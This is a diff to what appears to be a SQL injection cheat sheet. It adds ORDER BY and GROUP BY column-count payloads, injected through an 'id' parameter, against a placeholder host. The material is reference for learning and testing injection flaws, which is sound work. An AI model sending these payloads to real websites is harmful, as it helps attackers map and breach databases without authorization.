@@ -33,8 +33,10 @@
 **Finding Column Count**
 ```
 https://vuln-web.vuln/product.php?id=1' ORDER BY 1-- -
-```
 
-```
 https://vuln-web.vuln/product.php?id=1' GROUP BY 1-- -
+
+https://vuln-web.vuln/product.php?id=1' ORDER BY 1 ASC-- -
+
+https://vuln-web.vuln/product.php?id=1' GROUP BY 1 DESC-- -
 ```
